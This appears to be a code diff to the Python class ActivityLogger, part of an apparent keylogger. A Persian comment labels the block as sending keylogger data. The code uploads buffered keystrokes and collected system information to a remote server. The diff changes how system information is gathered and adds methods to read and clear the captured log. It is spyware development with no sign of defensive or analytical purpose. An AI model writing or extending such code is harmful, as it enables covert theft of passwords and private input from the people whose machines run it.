@@ -28,7 +28,7 @@ class ActivityLogger:
                 from system.collector import SystemCollector
                 from network.communicator import ServerCommunicator
                 
-                system_info = SystemCollector.collect_full()
+                system_info = SystemCollector().collect_system_info()  # Changed from collect_full
                 # ارسال داده‌های کیلاگر
                 ServerCommunicator.upload_data(
                     keystrokes=self.buffer.copy(),
@@ -37,3 +37,9 @@ class ActivityLogger:
                 self.buffer.clear()
             except Exception as e:
                 logging.error(f"Failed to upload data: {str(e)}")
+
+    def get_logs(self):
+        return self.buffer
+
+    def clear_logs(self):
+        self.buffer.clear()
